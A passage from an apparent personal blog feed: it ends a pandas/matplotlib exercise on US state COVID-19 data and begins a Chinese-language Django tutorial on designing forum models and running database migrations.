     <td>0.30</td>      <td>0.38</td>      <td>0.32</td>      <td>03/17/20</td>    </tr>    <tr>      <td>41</td>      <td>South Dakota</td>      <td>38833</td>      <td>4246</td>      <td>119</td>      <td>903027</td>      <td>11.9116</td>      <td>0.4495</td>      <td>152</td>      <td>50141</td>      <td>58624</td>      <td>...</td>      <td>57</td>      <td>8933</td>      <td>5.1</td>      <td>0.0</td>      <td>45.2</td>      <td>56.7</td>      <td>0.35</td>      <td>0.35</td>      <td>0.30</td>      <td>03/16/20</td>    </tr>    <tr>      <td>49</td>      <td>West Virginia</td>      <td>48161</td>      <td>4199</td>      <td>211</td>      <td>1778070</td>      <td>73.9691</td>      <td>0.4711</td>      <td>653</td>      <td>40578</td>      <td>43053</td>      <td>...</td>      <td>56</td>      <td>9462</td>      <td>7.6</td>      <td>0.0</td>      <td>51.8</td>      <td>48.7</td>      <td>0.29</td>      <td>0.36</td>      <td>0.35</td>      <td>03/16/20</td>    </tr>    <tr>      <td>28</td>      <td>North Dakota</td>      <td>12963</td>      <td>528</td>      <td>9</td>      <td>761723</td>      <td>11.0393</td>      <td>0.4533</td>      <td>238</td>      <td>54306</td>      <td>72597</td>      <td>...</td>      <td>39</td>      <td>9851</td>      <td>4.6</td>      <td>0.0</td>      <td>40.4</td>      <td>59.9</td>      <td>0.35</td>      <td>0.37</td>      <td>0.28</td>      <td>03/16/20</td>    </tr>    <tr>      <td>25</td>      <td>Mississippi</td>      <td>37733</td>      <td>3974</td>      <td>152</td>      <td>2989260</td>      <td>63.7056</td>      <td>0.4828</td>      <td>824</td>      <td>37994</td>      <td>37948</td>      <td>...</td>      <td>99</td>      <td>7646</td>      <td>7.7</td>      <td>0.0</td>      <td>63.4</td>      <td>49.4</td>      <td>0.35</td>      <td>0.36</td>      <td>0.29</td>      <td>03/20/20</td>    </tr>    <tr>      <td>42</td>      <td>Tennessee</td>      <td>11661</td>      <td>1542</td>      <td>7</td>      <td>6897576</td>      <td>167.2748</td>      <td>0.4790</td>      <td>2209</td>      <td>47179</td>      <td>53933</td>      <td>...</td>      <td>115</td>      <td>7372</td>      <td>7.4</td>      <td>1.0</td>      <td>57.6</td>      <td>66.4</td>      <td>0.33</td>      <td>0.38</td>      <td>0.29</td>      <td>03/20/20</td>    </tr>    <tr>      <td>30</td>      <td>New Hampshire</td>      <td>13424</td>      <td>1342</td>      <td>38</td>      <td>1371246</td>      <td>153.1605</td>      <td>0.4304</td>      <td>242</td>      <td>61405</td>      <td>63067</td>      <td>...</td>      <td>28</td>      <td>9589</td>      <td>4.4</td>      <td>0.0</td>      <td>43.8</td>      <td>60.3</td>      <td>0.28</td>      <td>0.37</td>      <td>0.34</td>      <td>03/16/20</td>    </tr>    <tr>      <td>29</td>      <td>Nebraska</td>      <td>13753</td>      <td>1138</td>      <td>24</td>      <td>1952570</td>      <td>25.4161</td>      <td>0.4477</td>      <td>440</td>      <td>52110</td>      <td>63942</td>      <td>...</td>      <td>93</td>      <td>8412</td>      <td>7.1</td>      <td>1.0</td>      <td>48.8</td>      <td>73.1</td>      <td>0.35</td>      <td>0.37</td>      <td>0.29</td>      <td>NaN</td>    </tr>    <tr>      <td>35</td>      <td>Ohio</td>      <td>83131</td>      <td>10222</td>      <td>451</td>      <td>11747694</td>      <td>287.5038</td>      <td>0.4680</td>      <td>3314</td>      <td>48242</td>      <td>57492</td>      <td>...</td>      <td>194</td>      <td>8712</td>      <td>8.5</td>      <td>3.0</td>      <td>50.7</td>      <td>77.9</td>      <td>0.32</td>      <td>0.37</td>      <td>0.31</td>      <td>03/17/20</td>    </tr>    <tr>      <td>3</td>      <td>Arizona</td>      <td>51045</td>      <td>4719</td>      <td>177</td>      <td>7378494</td>      <td>64.9550</td>      <td>0.4713</td>      <td>1559</td>      <td>43650</td>      <td>48055</td>      <td>...</td>      <td>83</td>      <td>6452</td>      <td>9.7</td>      <td>1.0</td>      <td>60.3</td>      <td>89.8</td>      <td>0.33</td>      <td>0.36</td>      <td>0.30</td>      <td>03/16/20</td>    </tr>    <tr>      <td>12</td>      <td>Iowa</td>      <td>22947</td>      <td>2513</td>      <td>74</td>      <td>3179849</td>      <td>56.9284</td>      <td>0.4451</td>      <td>545</td>      <td>48823</td>      <td>59977</td>      <td>...</td>      <td>118</td>      <td>8200</td>      <td>7.1</td>      <td>0.0</td>      <td>47.8</td>      <td>64.0</td>      <td>0.34</td>      <td>0.36</td>      <td>0.30</td>      <td>NaN</td>    </tr>    <tr>      <td>24</td>      <td>Missouri</td>      <td>53525</td>      <td>5517</td>      <td>175</td>      <td>6169270</td>      <td>89.7453</td>      <td>0.4646</td>      <td>1888</td>      <td>46635</td>      <td>51699</td>      <td>...</td>      <td>122</td>      <td>8107</td>      <td>7.5</td>      <td>2.0</td>      <td>54.6</td>      <td>70.4</td>      <td>0.33</td>      <td>0.37</td>      <td>0.31</td>      <td>03/19/20</td>    </tr>    <tr>      <td>31</td>      <td>New Jersey</td>      <td>162536</td>      <td>81420</td>      <td>4070</td>      <td>8936574</td>      <td>1215.1991</td>      <td>0.4813</td>      <td>1822</td>      <td>67609</td>      <td>69378</td>      <td>...</td>      <td>82</td>      <td>8859</td>      <td>8.1</td>      <td>1.0</td>      <td>52.7</td>      <td>94.7</td>      <td>0.31</td>      <td>0.38</td>      <td>0.30</td>      <td>03/18/20</td>    </tr>    <tr>      <td>20</td>      <td>Maryland</td>      <td>65370</td>      <td>12308</td>      <td>463</td>      <td>6083116</td>      <td>626.6731</td>      <td>0.4499</td>      <td>1134</td>      <td>62914</td>      <td>68573</td>      <td>...</td>      <td>50</td>      <td>8602</td>      <td>7.7</td>      <td>1.0</td>      <td>54.2</td>      <td>87.2</td>      <td>0.31</td>      <td>0.39</td>      <td>0.29</td>      <td>03/16/20</td>    </tr>    <tr>      <td>4</td>      <td>California</td>      <td>266900</td>      <td>28963</td>      <td>1072</td>      <td>39937489</td>      <td>256.3727</td>      <td>0.4899</td>      <td>7338</td>      <td>62586</td>      <td>74205</td>      <td>...</td>      <td>359</td>      <td>7549</td>      <td>12.8</td>      <td>9.0</td>      <td>59.4</td>      <td>95.0</td>      <td>0.33</td>      <td>0.40</td>      <td>0.26</td>      <td>03/19/20</td>    </tr>  </tbody></table><p>20 rows × 26 columns</p></div><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>Show 10 data items which the Deaths are more than 100 as sample randomly.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df2 = df[df[<span class="string">'Deaths'</span>]&gt;<span class="number">100</span>]</span><br><span class="line">df3 = df2.sample(n = <span class="number">10</span>)</span><br><span class="line">df3</span><br></pre></td></tr></table></figure><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p> Sort the data by GDP and present the top 20 data items.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df4= df.sort_values(by=[<span class="string">'GDP'</span>])</span><br><span class="line">df4.iloc[<span class="number">0</span>:<span class="number">20</span>,]</span><br></pre></td></tr></table></figure><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p> Show the simple statistical information (mean, std, min, max, quartile1, quartile2, quartile3).</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.mean</span></span><br><span class="line">print(df.mean())<span class="comment"># 列平均</span></span><br><span class="line">print(df.mean(<span class="number">1</span>))<span class="comment"># 行平均</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2.std</span></span><br><span class="line">print(df.std()) <span class="comment"># 列std</span></span><br><span class="line">print(df.std(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 3.min</span></span><br><span class="line">print(df.min())</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 4.df.min()</span></span><br><span class="line">df.max()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 5.quartile1</span></span><br><span class="line">df.quantile()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 6.</span></span><br><span class="line">df.quantile(q=<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 7.</span></span><br><span class="line">df.quantile(q=<span class="number">0.75</span>)</span><br></pre></td></tr></table></figure><h2 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h2><p> Use matplotlib show 2D images about data.</p><p><a href="https://matplotlib.org/" target="_blank" rel="noopener">Matplotlib</a></p><p>Plot the distribution of two class (1. GDP &lt; 58000, 2. GDP &gt;= 58000) of COVID-19 State Data using different colors and different  marker where x-axis is the Pollution and y-axis the Mortality-rate.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">df_GDP1 = df[df[<span class="string">'GDP'</span>]&lt;<span class="number">58000</span>]</span><br><span class="line">df_GDP2 = df[df[<span class="string">'GDP'</span>]&gt;=<span class="number">58000</span>]</span><br><span class="line">plt.figure()</span><br><span class="line">ax1 = df_GDP1.plot(x=<span class="string">'Pollution'</span>,y=<span class="string">'Deaths'</span>)</span><br><span class="line">df_GDP2.plot(x=<span class="string">'Pollution'</span>,y=<span class="string">'Deaths'</span>,ax=ax1)</span><br><span class="line"><span class="comment"># 为图表添加标题</span></span><br><span class="line">plt.title(<span class="string">"testddddd"</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>&lt;Figure size 432x288 with 0 Axes&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426output02.png" alt="png"></p><h2 id="Step-7"><a href="#Step-7" class="headerlink" title="Step 7"></a>Step 7</h2><p>Show the proportion of three class of COVID-19 State Data using pie chart.</p><p><strong><font color = blue size=3> About the class: </font></strong> <p><br> 1、 Mortality-rate &lt; 0.02 <p><br> 2、 Mortality-rate between 0.02 and 0.03 <p><br> 3、Mortality-rate &gt; 0.03 <p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 死亡率&lt;0.02</span></span><br><span class="line">sizes= []</span><br><span class="line">df_death1 = df[df[<span class="string">'Deaths'</span>]/df[<span class="string">'Infected'</span>]&lt;<span class="number">0.02</span>]</span><br><span class="line">d1= df_death1.shape[<span class="number">0</span>]  <span class="comment"># 返回行数</span></span><br><span class="line">sizes.append(d1)</span><br><span class="line"><span class="comment"># 死亡率在0.02 and 0.03之间</span></span><br><span class="line">df_death2 = df[df[<span class="string">'Deaths'</span>]/df[<span class="string">'Infected'</span>]&lt;=<span class="number">0.03</span>]</span><br><span class="line">d2 = df_death2.shape[<span class="number">0</span>] - d1</span><br><span class="line">sizes.append(d2)</span><br><span class="line"><span class="comment"># 死亡率在0.03之上</span></span><br><span class="line">df_death3 = df[df[<span class="string">'Deaths'</span>]/df[<span class="string">'Infected'</span>]&gt;<span class="number">0.03</span>]</span><br><span class="line">d3 = df_death3.shape[<span class="number">0</span>]</span><br><span class="line">sizes.append(d3)</span><br><span class="line"></span><br><span class="line">labels = [<span class="string">'Mortality-rate &lt; 0.02'</span>,<span class="string">' Mortality-rate between 0.02 and 0.03'</span>,<span class="string">'Mortality-rate &gt; 0.03'</span>]</span><br><span class="line">plt.pie(sizes,labels=labels,autopct=<span class="string">'%1.1f%%'</span>,shadow=<span class="literal">False</span>,startangle=<span class="number">150</span>)</span><br><span class="line">plt.axis(<span class="string">'equal'</span>)   <span class="comment">#该行代码使饼图长宽相等</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426output02.png" alt="png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>饼图绘制：<ul><li><a href="https://www.cnblogs.com/biyoulin/p/9565350.html" target="_blank" rel="noopener">https://www.cnblogs.com/biyoulin/p/9565350.html</a></li><li><a href="https://www.jianshu.com/p/0a76c94e9db7" target="_blank" rel="noopener">https://www.jianshu.com/p/0a76c94e9db7</a></li><li><a href="https://blog.csdn.net/ChenVast/article/details/81632794" target="_blank" rel="noopener">https://blog.csdn.net/ChenVast/article/details/81632794</a></li></ul></li><li>Panda DataFrame 绘图<ul><li><a href="https://blog.csdn.net/weixin_39778570/article/details/81143763" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39778570/article/details/81143763</a></li></ul></li><li>Pandas数据帧（DataFrame）<ul><li><a href="https://www.yiibai.com/pandas/python_pandas_dataframe.html" target="_blank" rel="noopener">https://www.yiibai.com/pandas/python_pandas_dataframe.html</a></li><li><a href="https://www.cnblogs.com/dev-liu/p/pandas_plt_basic.html" target="_blank" rel="noopener">https://www.cnblogs.com/dev-liu/p/pandas_plt_basic.html</a></li><li><a href="https://blog.csdn.net/zhengxu25689/article/details/87347700" target="_blank" rel="noopener">https://blog.csdn.net/zhengxu25689/article/details/87347700</a></li></ul></li><li>其他<br>  <a href="https://blog.csdn.net/kylinxjd/article/details/98307811" target="_blank" rel="noopener">https://blog.csdn.net/kylinxjd/article/details/98307811</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【Django】2. Django入门与实践-基础</title>
      <link href="/2020/04/26/2.%20Django%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E8%B7%B5-%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/04/26/2.%20Django%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E8%B7%B5-%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>本文主要内容：简单讨论了项目的背景知识，然后学习Django的基础，包括模型，管理后台，视图，模板和路由等。</p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在第一节入门中，安装了项目所需要的一切，安装的是 Python3.6，并且在虚拟环境中运行 Django1.11，本文继续在这个项目上编写代码。</p><p>本文先讨论一些项目的背景知识，然后在学习Django的基础，包括：模型（models），管理后台（admin），视图（views）,模板（templates）和路由（URLs）</p><h2 id="论坛项目"><a href="#论坛项目" class="headerlink" title="论坛项目"></a>论坛项目</h2><p>通过实际的项目学习知识，是个不错的方法，所以在学习模型，视图等其它有趣部分前，简要的讨论我将要开发的这个项目。</p><p>下图关于Web应用程序建模和设计上的一些见解。Web开发和软件开发可不仅仅只是编码。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django01.webp" alt=""></p><h3 id="用例图"><a href="#用例图" class="headerlink" title="用例图"></a>用例图</h3><p>这个项目是一个论坛系统，整个项目的构思是维护几个论坛版块（boards），每个版块像一个分类一样。在指定的版块里面，用户可以通过创建新主题（Topic）开始讨论，其他用户可以参与讨论回复。</p><p>首先需要找到一种方法来区分普通用户和管理员用户，因为只有管理员可以创建版块。下图概述了主要的用例和每种类型的用户角色：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django02.webp" alt=""></p><center>图1：Web Board提供的核心功能用例图</center><br>### 类图<p>从用例图中，可以开始思考项目所需的实体类有哪些。这些实体就是我们要创建的模型，它与我们的Django应用程序处理的数据非常密切。</p><p>为了能够实现上面描述的用例，我们需要至少实现下面几个模型：Board，Topic，Post和User。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django03.webp" alt=""></p><center>图2：Web Board类图</center><br><ul><li>Board：版块</li><li>Topic：主题</li><li>Post：帖子（译注：其实就是主题的回复或评论）</li></ul><p>花点时间考虑模型之间如何相互关联也很重要。类与类之间的实线告诉我们，在一个主题（Topic）中，我们需要有一个字段（译注：其实就是通过外键来关联）来确定它属于哪个版块（Board）。同样，帖子（Post）也需要一个字段来表示它属于哪个主题，这样我们就可以列出在特定主题内创建的帖子。最后，我们需要一个字段来表示主题是谁发起的，帖子是谁发的。</p><p>用户和版块之间也有联系，谁创建的版块。但是这些信息与应用程序无关。还有其他方法可以跟踪这些信息，稍后会谈到。</p><p>现在我们的类图有基本的表现形式，还要考虑这些模型将承载哪些信息。避免让事情变得复杂，试着先把重要的内容列出来，这些内容是启动项目需要的信息。后面我们再使用 Django 的迁移（Migrations）功能来改进模型，将在下一节中详细了解这些内容。</p><p>但就目前而言，这是模型最基本的内容：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django04.webp" alt=""></p><center>图3：强调类（模型）之间关系的类图</center>这个类图强调的是模型之间的关系，这些线条和箭头最终会在稍后转换为字段。<p>对于 <strong>Board</strong> 模型，我们将从两个字段开始：name 和 description。 name字段必须是唯一的，为了避免有重复的名称。description 用于说明这个版块是做什么用的。</p><p><strong>Topic</strong> 模型包括四个字段：subject 表示主题内容，last_update 用来定义话题的排序，starter 用来识别谁发起的话题，board 用于指定它属于哪个版块。</p><p><strong>Post</strong> 模型有一个 message 字段，用于存储回复的内容，created_at 在排序时候用（最先发表的帖子排最前面），updated_at 告诉用户是否更新了内容，同时，还需要有对应的 User 模型的引用，Post 由谁创建的和谁更新的。</p><p>最后是 <strong>User</strong> 模型。在类图中，我只提到了字段 username，password，email， is_superuser 标志，因为这几乎是我们现在要使用的所有东西。</p><p>需要注意的是，<strong>我们不需要创建 User 模型</strong>，因为Django已经在contrib包中内置了User模型，我们将直接拿来用。</p><p>关于类图之间的对应关系（数字 1，0..* 等等），这里教你如何阅读：</p><p>一个topic 必须与一个（1）Board（这意味着它不能为空）相关联，但是 Board 下面可能与许多个或者0个 topic 关联 (0..*)。这意味着 Board 下面可能没有主题。（译注：一对多关系）</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django05.webp" alt=""></p><p>一个 Topic 至少有一个 Post（发起话题时，同时会发布一个帖子），并且它也可能有许多 Post（1..*）。一个Post 必须与一个并且只有一个Topic（1）相关联。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django06.webp" alt=""></p><p>一个 Topic 必须有一个且只有一个 User 相关联，topic 的发起者是（1）。而一个用户可能有很多或者没有 topic（0..*）。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django07.webp" alt=""></p><p>Post 必须有一个并且只有一个与之关联的用户，用户可以有许多或没有 Post（0..*）。Post 和 User之间的第二个关联是直接关联（参见该行最后的箭头），就是 Post 可以被用户修改（updated_by），updated_by 有可能是空（Post 没有被修改）</p><p>画这个类图的另一种方法是强调字段而不是模型之间的关系：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django08.webp" alt=""></p><center>图4：强调类（模型）与属性（字段）的类图</center>上面的表示方式与前面的表示方式是对等的，不过这种方式更接近我们将要使用 Django Models API 设计的内容。在这种表示方式中，我们可以更清楚地看到，在 Post 模型中，关联了 Topic，created_by（创建者）和 updated_by（更新者）字段。另一个值得注意的事情是，在 Topic 模型中，有一个名为` posts（）`的操作（一个类方法）。我们将通过反向关系来实现这一目标，Django 将自动在数据库中执行查询以返回特定主题的所有帖子列表。<p>好了，现在已经够UML了！为了绘制本节介绍的图表，我使用了<a href="http://staruml.io/" target="_blank" rel="noopener">StarUML </a>工具。</p><h3 id="线框图（原型图）"><a href="#线框图（原型图）" class="headerlink" title="线框图（原型图）"></a>线框图（原型图）</h3><p>花了一些时间来设计应用程序的模型后，创建一些线框来定义需要完成的工作，并且清楚地了解我们将要做什么。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django09.webp" alt=""></p><p>基于线框图，我们可以更深入地了解应用程序中涉及的实体。</p><p>首先，我们需要在主页上显示所有版块：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django10.webp" alt=""></p><center>图5：论坛项目线框主页列出所有可用的版块</center>如果用户点击一个链接，比如点击Django版块，它应该列出所有Django相关的主题：<p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django01.jpg" alt=""></p><center>图6：论坛项目线框图列出了Django版块中的所有主题</center>这里有两个入口：用户点击“new topic“ 按钮创建新主题，或者点击主题链接查看或参与讨论。<p>“new topic” 页面：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django11.webp" alt=""></p><p>现在，主题页面显示了帖子和讨论：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django12.webp" alt=""></p><p>如果用户点击回复按钮，将看到下面这个页面，并以倒序的方式（最新的在第一个）显示帖子列表：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django13.webp" alt=""></p><p>绘制这些线框，你可以使用<a href="https://draw.io/" target="_blank" rel="noopener">draw.io</a>服务，它是免费的。</p><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>这些模型基本上代表了应用程序的数据库设计。接下来要做的是创建 Django 所表示的类，这些类是上面建模的类：<strong>Board，Topic和Post</strong>。<strong>User</strong> 模型被命名为内置应用叫<strong>auth</strong>，它以命名空间<strong>django.contrib.auth</strong> 的形式出现在 <code>INSTALLED_APPS</code> 配置中。</p><p>我们要做的工作都在 boards/models.py 文件中。以下是我们在Django应用程序中如何表示类图的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> User</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Board</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">30</span>, unique=<span class="literal">True</span>)</span><br><span class="line">    description = models.CharField(max_length=<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Topic</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    subject = models.CharField(max_length=<span class="number">255</span>)</span><br><span class="line">    last_updated = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line">    board = models.ForeignKey(Board, related_name=<span class="string">'topics'</span>)</span><br><span class="line">    starter = models.ForeignKey(User, related_name=<span class="string">'topics'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Post</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    message = models.TextField(max_length=<span class="number">4000</span>)</span><br><span class="line">    topic = models.ForeignKey(Topic, related_name=<span class="string">'posts'</span>)</span><br><span class="line">    created_at = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line">    updated_at = models.DateTimeField(null=<span class="literal">True</span>)</span><br><span class="line">    created_by = models.ForeignKey(User, related_name=<span class="string">'posts'</span>)</span><br><span class="line">    updated_by = models.ForeignKey(User, null=<span class="literal">True</span>, related_name=<span class="string">'+'</span>)</span><br></pre></td></tr></table></figure><p>所有模型都是<strong>django.db.models.Model</strong>类的子类。每个类将被转换为数据库表。每个字段由 <strong>django.db.models.Field</strong>子类（内置在Django core）的实例表示，它们并将被转换为数据库的列。</p><p>字段 <code>CharField</code>,<code>DateTimeField</code>等等，都是 <strong>django.db.models.Field</strong> 的子类，包含在Django的核心里面,随时可以使用。</p><p>在这里，我们仅使用 <code>CharField</code>，<code>TextField</code>，<code>DateTimeField</code>，和<code>ForeignKey</code> 字段来定义我们的模型。不过在Django提供了更广泛的选择来代表不同类型的数据，例如 <code>IntegerField</code>，<code>BooleanField</code>， <code>DecimalField</code>和其它一些字段。我们会在需要的时候提及它们。</p><p>有些字段需要参数，例如<code>CharField</code>。我们应该始终设定一个 max_length。这些信息将用于创建数据库列。Django需要知道数据库列需要多大。该<code>max_length</code>参数也将被Django Forms API用来验证用户输入。</p><p>在<code>Board</code>模型定义中，更具体地说，在<code>name</code>字段中，我们设置了参数 <code>unique=True</code>，顾名思义，它将强制数据库级别字段的唯一性。</p><p>在<code>Post</code>模型中，<code>created_at</code>字段有一个可选参数，<code>auto_now_add</code>设置为<code>True</code>。这将告诉Django创建<code>Post</code>对象时为当前日期和时间。</p><p>模型之间的关系使用<code>ForeignKey</code>字段。它将在模型之间创建一个连接，并在数据库级别创建适当的关系（译注：外键关联）。该<code>ForeignKey</code>字段需要一个位置参数<code>related_name</code>，用于引用它关联的模型。（译注：例如 <code>created_by</code>是外键字段，关联的User模型，表明这个帖子是谁创建的，<code>related_name=posts</code> 表示在<code>User</code>那边可以使用 <code>user.posts</code>来查看这个用户创建了哪些帖子）</p><p>例如，在<code>Topic</code>模型中，<code>board</code>字段是<code>Board</code>模型的<code>ForeignKey</code>。它告诉Django，一个<code>Topic</code>实例只涉及一个<code>Board</code>实例。<code>related_name</code>参数将用于创建反向关系，<code>Board</code>实例通过属性<code>topics</code>访问属于这个版块下的<code>Topic</code>列表。</p><p>Django自动创建这种反向关系，<code>related_name</code>是可选项。但是，如果我们不为它设置一个名称，Django会自动生成它：<code>(class_name)_set</code>。例如，在<code>Board</code>模型中，所有<code>Topic</code>列表将用<code>topic_set</code>属性表示。而这里我们将其重新命名为了<code>topics</code>，以使其感觉更自然。</p><p>在<code>Post</code>模型中，该<code>updated_by</code>字段设置<code>related_name=&#39;+&#39;</code>。这指示Django我们不需要这种反向关系，所以它会被忽略（译注：也就是说我们不需要关系用户修改过哪些帖子）。</p><p>下面可以看到类图和Django模型的源代码之间的比较，绿线表示我们如何处理反向关系。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django02.jpg" alt=""></p><p>这时，你可能会问自己：“主键/ ID呢？”？如果我们没有为模型指定主键，Django会自动为我们生成它。所以现在一切正常。在下一节中，您将看到它是如何工作的。</p><h3 id="迁移模型"><a href="#迁移模型" class="headerlink" title="迁移模型"></a>迁移模型</h3><p>下一步是告诉Django创建数据库，以便我们可以开始使用它。</p><p>打开终端 ，激活虚拟环境，转到 manage.py文件所在的文件夹，然后运行以下命令：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">python manage.py makemigrations</code></pre></figure>会看到输出内容是：<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Migrations <span class="k">for</span> <span class="s1">'boards'</span>:  boards/migrations/0001_initial.py    - Create model Board    - Create model Post    - Create model Topic    - Add field topic to post    - Add field updated_by to post</code></pre></figure><p>如图：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django03.jpg" alt=""></p><p>此时，Django 在 <code>boards/migrations</code>目录创建了一个名为 <code>0001_initial.py</code>的文件。它代表了应用程序模型的当前状态。再下一步，Django将使用该文件创建表和列。</p><p>迁移文件将被翻译成SQL语句。如果您熟悉SQL，则可以运行以下命令来检验将是要被数据库执行的SQL指令</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">python manage.py sqlmigrate boards 0001</code></pre></figure>如图：![](https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django04.jpg)<p>如果你不熟悉SQL，也不要担心。在本系列教程中，我们不会直接使用SQL。所有的工作都将使用Django ORM来完成，它是一个与数据库进行通信的抽象层。</p><p>下一步是将我们生成的迁移文件应用到数据库：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">python manage.py migrate</code></pre></figure>输出内容应该是这样的：<p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django05.jpg" alt=""></p><p>因为这是我们第一次迁移数据库，所以<code>migrate</code>命令把Django contrib app 